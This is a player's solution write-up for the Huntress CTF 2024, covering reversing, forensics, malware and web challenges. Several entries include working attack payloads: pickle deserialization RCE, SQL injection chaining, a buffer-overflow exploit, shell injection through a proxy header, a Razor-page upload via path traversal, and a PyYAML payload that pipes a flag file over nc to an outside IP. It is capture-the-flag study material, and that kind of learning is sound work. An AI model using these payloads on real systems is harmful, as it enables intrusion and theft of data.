# Huntress CTF 2024

Two or so challenges a day, for 30 days, released at https://huntress.ctf.games/challenges. A team event, though I solved all of them myself (with one or two exceptions, where I had some buddies give me a hand :) (and the two final Rust challenges bah where I failed altogether)

Really fun, though my reverse engineering skills need some work: I got almost all of them, but Rusty Bin and In Plain Sight defeated me and cost me a top 10 position (finished 44th).

Flags were in the format `flag{md5hash}` except where otherwise specified.

## Warmups

### I Can't SSH

A SSH server and a private key is provided. The private key is missing a new line at the end - add this to make it work and you can ssh in to get the flag.

### Typo

A SSH server is provided. When you SSH in a train moves across the screen then the session is ended. Bypass by adding `-T` to the SSH command, so a pty terminal is not created. You can then cat the flag.

### Zulu

The file is compressed data. Use `7z x zulu` to recover the flag.

### Finder's Fee

You get access to a SSH server. The /usr/bin/find command has the suid bit set, allowing you to use it to get a shell as the 'finder' user and get the flag from their home folder.

### Mystery

This is the configuration for an enigma machine, the one in cyberchef is sufficient to decode the message

### Unbelievable

A download labelled halflife_3_ost.mp3 is provided (HL3 is infamous in not being released within the 2 years promised some 20 years ago). The file is actually an image of the flag, just change the extension.

### TXT Message

dig the provided domain, and one of the DNS txt records will have a bunch of text in Octal form; from octal in cyberchef will reveal the flag.

### Whamazon

The server can be connected to and will present a primitive store front over the terminal. To 'afford' the flag, buy a negative quantity of something.

### Too Many Bits

A sequence of binary numbers - just put into cyberchef and use 'From Binary' to get the flag

### Technical Support

The flag was in the #ctf-open-ticket channel on Discord

### Cattle

A text file is provided containing many words like `Moo MoO mOo` etc. This is https://esolangs.org/wiki/COW and can be decoded using an online compiler.

### Read The Rules

The flag was on the rules page: https://huntress.ctf.games/rules

### MatryoshkaQR

A QR code png was provided. Using Parse QR in cyberchef would reveal hex data for another PNG, which could then be parsed again. After a few repetitions of this, the flag was uncovered.

### The Void

Connecting to the server will stream endless blank characters back. If you save these to a file you will see its repeating characters like (in hex): `1b 5b 33 30 3b 34 30 6d 20 1b 5b 30 6d `. At a certain point these will 'wrap' single readable ascii characters that make up the flag, e.g. `1b 5b 33 30 3b 34 30 6d 66 1b 5b 30 6d` where `66` is `f`. To solve, pop in cyberchef and replace `1b 5b 33 30 3b 34 30 6d` with blank, `1b 5b 30 6d` with blank, `20` with blank (it opens with mass space characters), then use from hex to see the repeating flag.

## Reverse Engineering

For most of these I used Ghidra first, GDB with GEF second, and IDA Free third - with GoCrackMe3 I used all three tools to help understand what was going on :D

### OceanLocust

This is not really a reversing challenge, at least not the way I solved it. You are given a binary (actually two binaries, one debug and one release) and a PNG and told that the flag has been hidden in the PNG. The inference is that you must reverse the binary to work out how the message is hidden. However, you can solve this without reversing at all:

1. First, know that a PNG is made up of chunks - small blocks with a key and arbitrary data. Some hold PNG meta data, some palettes etc, but a PNG can hold any number of chunks and they don't have to have anything to do with the image at all
2. Use the binary to encode a long string of As into a tiny PNG file, then open the result with a chunk viewer (I used https://www.nayuki.io/page/png-file-chunk-inspector). You will see the repeating pattern and with a bit effort can discover the trick: the message is being encoded in chunks named bitA, bitB, bitC etc with each portion of the message XOR'd with the chunk key, e.g. AAAA becomes 23 28 35 00 in hex, after being XOR'd with 'bitA'.
3. Recover the flag from the provided image using this encoding scheme. You will know you are doing it correctly when you get `flag{` from the first anomalous PNG chunk.

### GoCrackMe1

This is a Go binary encoded with debug symbols. Open with Ghidra or IDA Free, find the main.main function, and see the bytes of the flag and the XOR key used.

### GoCrackMe2

Debug symbols have been stripped, but if you open with IDA Free it will find the main.main function. Here there are portions of the flag loaded into the stack from position 0x4e7069 down (shown as a block in IDA), seen by the telltale strings of hex data. Going through the rest of the function, you can look for XORs or ADDs or whatever that might transform the data, and at 0x48831a you can see a xor with 0x6d. Using cyberchef you can recover all portions of the flag and reassemble.

### GoCrackMe3

This is a really involved, and for me fun, challenge. I used IDA, Ghidra and GDB with GEF, just for the different views on what was going on; GDB to step through the binary, then trace the addresses back in IDA and Ghidra. The binary does a few things:

1. initially it checks if the binaries name is HackersGonnaHackHuntressGonnaHunt - if not it prints an initial access denied
2. it then does a little random looping, which is where the flag is hidden
3. afterwards it prints 'Access still Denied', but this can be skipped by setting the right values in GDB and getting to a point where it says 'will not print flag but will print its length' or similar.
4. after this there is also a 'impossible' branch, that includes a message 'you wont find the flag here' etc

Convoluted, will be good to see the source code for this. But anyway there is a loop that starts at 0x4f7d30. It appears to generate a random number, then loop until RCX reaches 5 - with a chance the loop is exited early an 'still denied is printed'. This loop will load a portion of the flag into memory - which portion seems random, but there are four. Over enough runs you can get these four sequences out of memory, then combine them in different ways until you get the correct flag.

There is probably a better way for this - will see when the source is released - but a flags a flag.

### Stack It

A small 32bit binary. Its entry function will XOR one section of memory with another; put those two 32 byte sequences into cyberchef and xor them to get the body of the flag, then wrap it with flag{} and submit.

### Knights Quest

I could open this in IDA Free and see the functions, however the base address was off compared to when run in GDB. To solve I used `find 0x400000, 0x500000, 0x446B684155444F42`, searching for one of the strings I could see in IDA at `0x4b3d5a` - one address popped up, and by running `x/5i addr-2` I was able to find the actual address of the instruction (for me `0x4992da`). By calculating the difference, then subtracting this from the default base address of `0x400000` I could rebase IDA and have instructions in the correct places. Then I set a breakpoint at 0x4b2863 (pre rebase) the point where the player's damage value is loaded into rsi (`mov     rsi, [rdx+20h]`) and set rsi's value to something like `0xffffffff`. Doing this when fighting the final monster is sufficient to kill it in one hit, which results in the password being printed needed to request the flag from the server.

### That's Life

Tools used: GDB with GEF, IDA Free and a little gorekt redress/binary ninja for context gathering.

A website gives a download called gameoflife, go binary that will run Conway's Game of Life in the terminal. Each iteration it saves the game state to a file called game_state.pb, and uploading this to the website will result in the flag if the state is correct. Though not explained, there are 12 cells in the state that must be both alive and the right colour for it to be a winning state, and this is tracked by a status row at the bottom of each iteration (usually all X's, e.g. | X | X | X and so on, indicating state not met).

This was a big challenge, both working out what was happening, what was required, and then getting to that state. To figure out the win conditions I used https://github.com/goretk/redress to extract types, where I saw the win condition struct (x, y, color) - already I had determined that at 0x564320 it runs a 12 step loop, where if all checks pass the 'congrats' message is printed telling you to upload the state file.

The checks, run at 0x564374 and 0x564383, check if the cell is alive and then that its colour matches the prescribed win conditions. At the latter address, these colours can be printed with x/200x $r9, revealing both the positions of the checked cells (row, col?) and colour values, which are in order `0x1f`, `0x20`, `0x21`, `0x22`, `0x23`, `0x24`, `0x25`, `0x1f`, `0x20`, `0x21`, `0x22`, `0x23`.

To solve I took several steps - there is probably an easier and much less wonky way, like reversing the protobuf save file and editing it directly, but this approach got the game to generate the state for me:

1. I created a game state with all cells alive. this can be done by modifying various values in the 'grid next' function: specifically 0x563e71 (`mov byte ptr [r8+r10], 0`) can be changed to set the ptr to 1 instead, with `set {char} 0x563e75 = 0x1`. Once this round runs through and the sate is saved, it should be roughly 79 KB.
2. Restart the binary, and put a breakpoint at `b *0x564379` - this is just before the check for colour.
3. when the break point is hit, run these two commands:
    - `set $addr = $r12 + $r10 * 1 + 0x8` - this creates a variable pointing at the location of the cell colour
    - `set {char} $addr = 0x1f` this sets the colour to the first correct colour
4. continue and hit the breakpoint again (optionally si twice to confirm that r10 and r11 are comparing the same value), updating the colour each time in order (you will need to set the address again but the address expression wont change)
5. after the 12th colour, step until you reach `test sil, sil` - this tests whether the win message should be printed. at this point the gamestate file hasn't been updated, so we need to skip this. run `set $rsi = 0x0` to fail the check, but dont continue yet!
6. before continuing, the game of life code needs to be sabotaged: instruction 0x563d2d is where if the neighbours of a cell number at 2, it is left alone. this will not be true for any cell in the all alive game state, so this cmp instruction needs to be removed without breaking the program and with the `jz` operation at 0x563d31 taken. use the following instructions to change the cmp to a xor of eax (which will cause jz to jump) with two nops for padding:

```
set {char} 0x563d2d = 0x31
set {char} 0x563d2e = 0xc0
set {char} 0x563d2f = 0x90
set {char} 0x563d30 = 0x90
```

7. you can now continue. you can delete breakpoints - all going well, the congrats message should print and the gamestate (still 79 KB) should be uploadable for the flag. if you leave the breakpoint at 0x564379, you can step through the comparisons to be sure that after the grid next step, serialization and deserialization, the target cells are still alive and the correct colour.

tough challenge, but fun (well, having beat it it was very satisfying).

**UPDATE**: i found a second way to solve this, by reversing the protobuf serialization and recreating the state file. it still requires getting the list of correct colours out of r9 as above, and the use of redress to figure out the structure of the protobuf types (though solved below) but might be 'cleaner':

1. create a grid.proto file with the following content:

```proto
syntax = "proto3";

package pb;

message Cell {
  bool alive = 1;
  int32 color = 2;
}

message CellRow {
  repeated Cell cells = 1;
}

message Grid {
  int32 width = 1;
  int32 height = 2;
  repeated CellRow rows = 3;
}
```

2. use protoc to create a go module for this project, `protoc --go_out=. --go_opt=paths=source_relative --go_opt=Mgrid.proto=./pb grid.proto`

3. the following main.go code will generate a game_state that will be valid for the flag:

```go
package main

import (
    "log"
    "os"

    "google.golang.org/protobuf/proto"
    "thatslife/pb"
)

var aliveCells = [][3]int{
    {10, 15, 31}, {20, 25, 32}, {30, 35, 33}, {40, 45, 34}, {25, 50, 35},
    {5, 55, 36}, {15, 60, 37}, {35, 65, 31}, {45, 70, 32}, {0, 75, 33},
    {1, 80, 34}, {2, 85, 35},
}

func main() {
    grid := &pb.Grid{
        Width:  400,
        Height: 50,
        Rows:   make([]*pb.CellRow, 50),
    }

    for i := 0; i < int(grid.Height); i++ {
        row := &pb.CellRow{
            Cells: make([]*pb.Cell, grid.Width),
        }
        for j := 0; j < int(grid.Width); j++ {
            row.Cells[j] = &pb.Cell{Alive: false, Color: 0}
        }
        grid.Rows[i] = row
    }

    for _, coord := range aliveCells {
        row := coord[0]
        col := coord[1]
        val := coord[2]
        if row < int(grid.Height) && col < int(grid.Width) {
            grid.Rows[row].Cells[col].Alive = true
            grid.Rows[row].Cells[col].Color = int32(val)
        }
    }

    data, err := proto.Marshal(grid)
    if err != nil {
        log.Fatalf("Failed to serialize grid: %v", err)
    }

    err = os.WriteFile("game_state.pb", data, 0644)
    if err != nil {
        log.Fatalf("Failed to save file: %v", err)
    }

    log.Println("Grid saved successfully")

}
```

### Rusty Bin

This one was a real struggle, and I needed help for it. The windows exe provided will ask for 'the password', and when you respond with 'the password' it gives you a clue, one of three four character sequences seemingly from the flag. Tracing the binary in IDA Free, its a Rust binary with main at 0x7FF6FBE111A0 (assuming a base of 0x7FF6FBE10000). One tricky thing is that strings are all stored as a random string XORed with a key, which gets decoded by the loop at 0x7FF6FBE126CE - this makes them almost impossible to find in memory.

Tracing the clues when they are printed will reveal not just each 4 byte clue and its xor key, but also that seemingly all portions of the flag are distributed this way: they can be extracted more easily from a memory dump, and then looking for the prefixes 780805f2003f, 780904f2003c, 780905f2003c, 780905f2003e, 780906f2003c, 780909f2003c and 780920f2003c. After each prefix there is four bytes then the repeating sequence AB AB AB AB.

With a bit of effort you can match the extracted four bytes to their four bytes extracted xor keys, and get all the parts of the flag. At this point, the only path forward for me was to calculate all 5040 combinations and then run a very slow brute force on the flag server. Will update when I discover how the ordering was supposed to be extracted.

## Cryptography

### No Need For Brutus

The string provided has been modified using a caesar cipher (hence the brutus comment). By using 'Rot13' in Cyberchef and changing the amount, you can uncover an english string (starts with `caesar`...). the flag is this value MD5 hashed then wrapped with flag{}.

### Strive Marish Leadman TypeCDR

Once you connect to the server over nc you are presented with parameters for the RSA cipher. I used https://www.dcode.fr/rsa-cipher to decode the message (the flag); note the phi value is not provided nor needed, and this tool requires integer values not hex so I used cyberchef with 'from base (16)' to translate them.

## Forensics

### Hidden Streams

You get a large sysmon.evtx file. The title (and a small poem) refer to alternate data streams, a technique in windows where files can have more than one set of content. In Sysmon, creating one of these streams has event ID 15 - find the entry, and look at the details to find a base64 encoded flag.

### Keyboard Junkie

The provided file is a pcap. By extracting usp.capdata and referencing a USB Scan Code table you can uncover the hidden message, which includes the flag.

### Zimmer Down

A NTUser.dat file is provided. Using a tool like RegistryExplorer from Eric Zimmerman's tools, navigate to recently opened files, `\Users\<username>\AppData\Roaming\Microsoft\Windows\Recent`. The flag is in one of the filenames, base32 encoded.

### Obfuscation Station

The provided powershell contains a base64 string, that you then need to raw inflate (use cyberchef) to get the flag.

### Backdoored Splunk II

A website asking for a auth header and a download of a splunk plugin is provided. In the download, within the `/bin/powershell/dns-health.ps1` setup script, there is a long sequence of decimal characters. Decode this with cyberchef and its powershell that runs a base 64 command. Decode that and its a webrequest adding a basic auth header. Make a request to the website with that auth header and there will be a base64 string in a comment in the response. This contains the flag.

### Ancient Fossil

A single sqlite3 database is provided, named `ancient.fossil`. A bit of research found https://fossil-scm.org/, which when run as `fossil ancient.fossil` would open a UI for interaction with the repository. Browsing through the commits and checking the files created and deleted, eventually found one with the flag.

### Palimpsest

Last challenge of the comp. A scheduled task definition and three event files are provided. The largest, Application.evtx, contains numerous events with funny descriptions (e.g. 'The Windows Store has started offering emotional support for rejected apps') and a binary field with hex data. Extract all these funny events, put their hex-formatted binary data in order, convert to binary and the result is an mp4 file that plays a video showing the flag.

## Malware

Note several of these challenges will trigger antivirus solutions, and some are dangerous to run.

### X-Ray

the message on the challenge says that the provided file is malware that has been quarantined: antivirus software, when it detects malware, will usually encrypt it or something to make the file recoverable but otherwise non-functional. Here, the file has been quarantined by Microsoft Defender which uses the RC4 cipher to hide the file and its metadata: the key for this is available online. Decrypt the file and save it, then use a tool like 'foremost' to extract a .NET executable from the result. Once done, a decompiler like dotPeek can be used to extract two hex strings, one used to XOR the other to hide the flag.

### Discount Programming Services

The provided python contains a chunk of text that is reversed, decoded from base64 then zlib inflated. Once done this will reveal another chunk of text where the operation needs to be repeated (many times). To solve, I used this recipe in cyberchef: `https://gchq.github.io/CyberChef/#recipe=Reverse('Character')From_Base64('A-Za-z0-9%2B/%3D',true,false)Zlib_Inflate(0,0,'Adaptive',false,false)Find_/_Replace(%7B'option':'Simple%20string','string':'exec((_)(b%5C''%7D,'',true,false,true,false)Find_/_Replace(%7B'option':'Simple%20string','string':'%5C'))'%7D,'',true,false,true,false)`,  after each execution pressing the button that replaces the input with the output. Over numerous runs this will eventually result in the final encoded flag.

### Revenge of Discount Programming Services

A binary is provided that is actually a pyc installer. You can get the pyc files with something like https://github.com/extremecoders-re/pyinstxtractor. The resulting pyc files are in python 3.9, which can be tricky to reverse, however I found https://www.lddgo.net/en/string/pyc-compile-decompile which worked on challenge.pyc, revealing reversed base64 that then needs to be zlib inflated (similar to the prior challenge in this series).

Reversing this over numerous iterations will eventually reveal a wall of decimal values. From decimal in cyberchef will reveal python that zips two hex strings together - just running this python will return another set of rev-base64-compressed to continue the recursive reversing process on. Doing this for a while will reveal the flag.

### Strange Calc

A little trickier: a binary, calc.exe was provided. By examining strings you could find it was made with a tool named AutoIT (https://www.autoitscript.com) and the version of that tool. Getting that version from https://www.autoitscript.com/autoit3/files/archive/autoit/ includes a decompiler, which can get you the original script. In there, a jse (jscript) file is created and run using wscript on windows. The jse content is itself encoded, but can be decoded with https://github.com/sstraw/scrdec. This will reveal a final script which performs some complex encoding on a bit of hex data - by modifying the script to print the string after its been demangled you can get the flag.

Note, do not run the calc.exe file directly - it asks for admin privileges and once granted, will create a local admin account. The flag is set as the password.

### Mimi

The provided file (named `mimi`) is a lsass.dmp. Load this in Pypykatz and dump logons to get the flag. For some reason, proper mimikatz would not work (likely due to windows version mismatches) but pypykatz worked fine.

### Russian Roulette

This one is dangerous and shouldn't be examined on a windows machine. I used WSL after moving it to the linux home folder. The zip file can be extracted with 7zip, and contains a windows shortcut. Using strings on the shortcut will reveal it executes a base64 string, which when decoded reveals it downloads a file from a web address and runs it with powershell. The file is a heavily obfuscated windows cmd shell script, but can be decoded by:

- removing all the comment lines (start with `:: ` or `rem` - all the russian text is in these, and after removal the script will be ascii not unicode)
- recognising that %text% means replace with aliased text, set using the `set` command. It starts with `set ucbw=set` and then follows with `%ucbw% qmy= `, so immediately uses the alias for set to create an alias for space as qmy, and so on. this can be done manually or scripted, but will eventually reveal the flag.

### Eepy

Poking about in this small binary, you can find a function that XORs a string with 0xAA. Then, browsing through the assembly, you can find a series of hex characters that when XORd reveal the flag. The first five will be `CC C6 CB CD D1`

### Eco Friendly

A powershell script that uses formatting to hide its content: basically a format string in powershell is something like '{1}{2}{3}' -f "a","b","c". This script uses massive format strings (the first one is 7mb long). To extract, remove the starting `iex`, then run the script with powershell; the output will be another formatting string, but shorter. Remove the iex and repeat. Two more times before the final result is the flag.

### Rustline

A set of files are provided, along with their encrypted equivalents. The encryption is just XORing - take a big file, like the ssh key, xor it with its encrypted version to get the key, then use this key to XOR other encrypted files e.g. the flag file.

### Ping Me

The file provided is obfuscated vbs, I decoded it with the following script (run with `cscript.exe deobs.vbs ping_me.vbs > res.vbs`):

```vbscript
Option Explicit

Function Defuscator(vbs)
    Dim t
    t = InStr(1, vbs, "Execute", 1)
    t = Mid(vbs, t + Len("Execute")) 
    t = Eval(t)
    Defuscator = t
End Function

Dim fso, i
Const ForReading = 1
Set fso = CreateObject("Scripting.FileSystemObject")
For i = 0 To WScript.Arguments.Count - 1
    Dim FileName
    FileName = WScript.Arguments(i)
    Dim MyFile
    Set MyFile = fso.OpenTextFile(FileName, ForReading)
    Dim vbs
    vbs = MyFile.ReadAll    
    WScript.Echo Defuscator(vbs)
    MyFile.Close
Next
Set fso = Nothing
```

The result is a script that pings 10 IP addresses - the octets are decimal ascii characters. E.g. the first IP is `102.108.97.103` which is `flag`: 102 is decimal ascii for `f`.

## Miscellaneous

### System Code

Worst challenge of the CTF, imho. Took me days of wasted effort, for largely nothing - nothing learned, no sense of satisfaction on completion.

Basically a site asking for a input value, with the matrix rain from the films in the background. The hint was 'follow the white rabbit'. The path was dumb:

1. by comparing all the files the site uses vs the files on the repo for the matrix rain project, you will see config.js has been modified
2. amongst all the modifications, one extra key has been added: `backupGlyphsTwr: ["a","b","c","d","e","f"]`. Apparently you were supposed to realise this was the path forward, as Twr at the end of the key name is the initials of The White Rabbit.
3. then, brute force the input field, using those six characters as the list. The solution was a six letter long combination of these.

Ugh.

### Red Phish Blue Phish

A 'smtp' server is provided to connected to and a user email you need to 'phish'. This was a bit of a stupid challenge in my view, since the content / subject of the email sent to the user was irrelevent - all that was needed was to use the right from address, and a specific address at that (imho some checking of content and flexibility in from address would have been better). Online you can find the company website, and by trying different from addresses (go through the staff list - its not the CEO) it will eventually work and the server will give you a flag.

Note, to send an email you need to use the standard SMTP commands, HELO, MAIL FROM, RCPT TO, then DATA. data will terminate after you type \n.\n, but with standard netcat this won't work properly. Using telnet worked fine (nc -C should work too).

### Base-p-

An encoded string made up of unicode chinese characters. The -p- is a big hint actually, as in nmap this means 0-65535. Here specifically the encoding is Base65536. By decoding you will unravel an image of seven (I think?) coloured squares: the RGB values of each square, in hex, in order is the hex encoding of the flag.

### Sekiro

A fairly fun challenge: a server is provided to connect to Sekiro/Anime themed. You are presented with the actions of your opponent (strike, block, advance, retreat) and must respond with the correct counter action (respectively block, advanced, retreat and strike). There is a short delay before the first challenge, then sets of four where you have decreasing time to respond (a few seconds in the first block, possibly impossible in the second and third).

An expect script can solve this, run with `expect s.sh`:

```bash
#!/usr/bin/expect

set timeout -1
spawn nc challenge.ctf.games 30301
while {1} {
    expect {
        "Opponent move: advance" {
            send "retreat\n"
        }
        "Opponent move: block" {
            send "advance\n"
        }
        "Opponent move: strike" {
            send "block\n"
        }
        "Opponent move: retreat" {
            send "strike\n"
        }
        default {
        }
    }
}
```

### 1200 Transmissions

A wav file is provided, which if played will be a screeching noise recognisable as demodulated audio (e.g. modem data). On linux the tool `minimodem` can decode the message which contains the flag:

`minimodem --rx --ascii -f transmissions.wav 1200`

### Malibu

The hint was 'what do you bring to the beach?'. You bring a bucket to the beach. `/bucket` will show a file listing, and if you get each file you will see they are masses of random data. However, one will set of data will end with the flag.

### Permission to Proxy

The url provided reveals a squid proxy, which is throwing an error saying '/' is an invalid URL. In the response headers there is a caching header that reveals the interior server host and port. By using the challenge URL and port as a http proxy (e.g. with curl, or as an upstream proxy with burp) and brute forcing ports on that internal address you can find ports 22, 3128 (the proxy) and 50000 are open - the last returning garbled data as if a get request was fed into a bash prompt. You can get effective RCE on port 50000 by passing a header in the form `test:;id` for example: `test:` is a valid header key and so will go through the proxy, but will be rejected by bash. Then ;id will execute for output, e.g. with curl:

`curl --proxy http://challenge.ctf.games:31835 http://permission-to-proxy-b278cfd5497f9976-55b7c44d84-lzpck:50000 -H "test:;ls -la home"`

Enumeration will find a readable private key under the user folder. You can then ssh in with a command like:

`ssh user@permission-to-proxy-b278cfd5497f9976-55b7c44d84-lzpck -i id_rsa -o "ProxyCommand=nc -X connect -x challenge.ctf.games:31835 %h %p"`

The bash binary on the box has the suid bit set, which can get you to root.

### Time will tell

The script for the server is provided, and simulates a proper python timing attack (python string comparison is o(n)). To beat, testing all possible characters and picking the one that takes 0.1 seconds longer than the others will allow you to build up the solution. I used the following script:

```python
import time

from operator import itemgetter
from pwn import *

TOKEN_SIZE = 8

def find_next_character(base, conn):
    timings = []

    print("Trying to find the character at position %s with prefix %r" % ((len(base) + 1), base))
    for _, character in enumerate("0123456789abcdef"):
        before = time.perf_counter()
        conn.sendline(base + character + "0" * (TOKEN_SIZE - len(base) - 1))
        data = conn.recvline()
        if b"Well done" in data:
            print(data)
            exit(0)
        after = time.perf_counter()
        timings.append({'character': character, 'timing': after - before})

    found_character = list(sorted(timings, key=itemgetter('timing'), reverse=True))[0]

    print("Found character at position %s: %r" % ((len(base) + 1), found_character['character']))
    return found_character['character']

def main():

    conn = remote(b'challenge.ctf.games', 31490)
    print(conn.recvuntil(": "))

    base = ''

    while len(base) != TOKEN_SIZE:
        next_character = find_next_character(base, conn)
        base += next_character
        print("\n\n", end="")

if __name__ == '__main__':
    main()
```

## Scripting

### Base64By32

The flag has simply been base64 encoded 32 times in a row. That is, decode from base64, then decode from base64, then ... etc until you get the flag.

### Echo Chamber

A PCAP is provided, full of icmp (ping) requests. Each ping has a data field that is a hex string (all the same character, and this repeats across two ping requests). Putting the bytes one at a time into something like CyberChef will reveal that it starts with the PNG header.

To extract the image, you can do this in three steps:

1. Extract the data field from every packet into a text file with tshark: `tshark -r echo_chamber.pcap -Y "icmp" -T fields -e data > out.txt`
2. Take every second line and the first byte (two characters in hex) into another file using awk and tr: `awk 'NR % 2 == 0 {print substr($0, 1, 2)}' out.txt | tr -d '\n' > out2.txt`
3. Finally open the file in CyberChef, use 'From Hex', then save as a PNG. The image is of the flag.

## OSINT

### Ran Somewhere

Several PNGs embedded in an email file. You need to submit the location (a named location). An OSINT challenge. I got some help from some geoguesser friends on this one - will say its in Maryland US somewhere.

## Binary Exploitation

### Baby Buffer Overflow - 32bit

The source for a 32 bit ret2win binary is provided. A overflow buffer of 28 characters and then the address of the target function will give a shell, e.g. (using pwntools):

```python
from pwn import *

conn = remote('challenge.ctf.games', 31647)
data = conn.recvuntil("Gimme some data!")
print(data)

payload = b"\x41"*28 + b"\xf5\x91\x04\x08\x00"
conn.sendline(payload)

conn.interactive()
```

## Web

### MOVEable

The source for the app is provided, a flask app. It can help to run this locally: the site has a few problems. First it uses 'executescript' when performing its login check, which cannot return rows and so logging in convetionally is impossible. Second, the sites main functionality is downloading files however the code to send a downloaded file is incorrect for this flask version, so that functionality cannot work.

The trick to this one is two fold:

- the executescript used for logging in can take chained statements, which means you can pass something like `\;insert/**/into/**/activesessions/**/(session_id,username)/**/values/**/(\test\,\test\)/**/--/**/` (leveraging a flaw where `\` is replaced with `'`)
- with a valid session id, and the above chaining, you can add files into the files table then 'download' them via /download/filename/sessionid. As mentioned the download functionality doesnt work, however, it uses pickle loads to read file blob data first which means it is vulnerable to pickle deserialization attacks.

With this I used a script to create a pickle payload that would allow me to execute arbitary commands:

```python
import pickle
import base64
import os


class RCE:
    def __reduce__(self):
        cmd = ('import os;flash(os.popen(request.args.get("cmd")).read())')
        return exec, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```

By creating a file with the result of this, browsing to the file with a cmd parameter would result in a redirect with the command output in a flash.

From this you can find the user (moveable) has sudo all rights, then find the flag in the /root directory.

### Y2J

A website where you can provide YAML and it will be serialized to JSON. A bit of testing reveals this is python, and there are a few exploits for PyYAML available though many are stymied by needing to be serializaed to JSON after exploitation, preventing file read (afaics). However, nc is available on the machine - I couldn't get a rev shell (didn't really try hard) but you can pipe commands to a remote server, e.g. `!!python/object/apply:os.system ["cat /flag.txt | nc 54.170.88.92 4444"]`

### HelpfulDesk

A site with a login form, and security bulletins providing patches (a little confusing since it provides the patch for the latest version, but is running the previous version?). Anyway, to find the change I downloaded both patches, extracted, used `diff --recursive` to find only the .dll had change, used dotPeek to extract the dll's as projects, ran diff again to find a line in the SetupController had changed. The line in question controlled access to `/Setup/SetupWizard` which if accessible allows you to set the admin credentials. By putting a `/` on the end of this the control is bypassed and you get access.

Once in you can browse various systems. The first has the flag on its desktop. Cool challenge.

### Plantopia

The website provided has an API, and the auth token can be forged (its admin.1.epochdate, base64 encoded, shown in the auth popup on the swagger api). Each plant has a possible alert command, which is a straight shell value: you can set this with a call to `GET /api/plants/3/edit`, run it with a call to `POST /api/admin/sendmail` (passing the plant id), and see the results with a call to GET `/api/admin/logs`. The flag is in the web directory.

### Pillow Fight

A website where you can combine images. There is a link to the API, where one of the three parameters (two are images) is a python eval command. Receiving a response is tricky, since the result of the eval command must be cabable of 'save': my solution was to use the existing example, `convert(img1 + im2, "L")` and trigger errors to extract the flag. E.g.: `convert(img1 + img2, __import__('os').popen('tail -c +0 flag.txt | head -c 8').read())` which will return an error like: "conversion from L to flag{b6b not supported". I then read out the flag in small chunks and reassembled.

### Zippy

A website where you can upload files. Proudly claims its razor pages with runtime compilation. The browse page takes absolute paths, and you can enumerate the server finding /app/flag.txt and /app/Pages/ where the cshtml razor pages are. The upload functionality doesn't restrict file type, and the 'ID' form field is appended as a directory name to /app/wwwroot/uploads/ (e.g. id 1 would make this /uploads/1/). The JS of the page will prevent path traversal but disabling this or using burp repeater will allow you to upload files to arbitrary locations.

The solution (for me) was to upload a custom cshtml file into /Pages/, overwriting the unused privacy.cshtml file then browsing to /Privacy on the website. In burp this looked like:

```
{"accountId":"../../Pages/","accountName":"test","fileName":"Privacy.cshtml","fileContent":.....
```

The content was the following razor content, base64 encoded:

```razor
@page

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flag Display</title>
</head>
<body>
    <h1>Flag Display</h1>
    <div>
        <p>Contents of the flag file:</p>
        <pre>
            @{
                var filePath = "/app/flag.txt";
                string fileContent;

                if (System.IO.File.Exists(filePath))
                {
                    fileContent = System.IO.File.ReadAllText(filePath);
                }
                else
                {
                    fileContent = "File not found.";
                }

                @fileContent
            }
        </pre>
    </div>
</body>
</html>
```

## Grouped

These (Little Shop of Hashes, Nightmare on Hunt Street) are collections of logs with questions based on reversing what occurred. Best tool for examining the files is EvtxeCmd from Eric Zimmerman's tools, which can turn log files into CSVs for easier analysis.
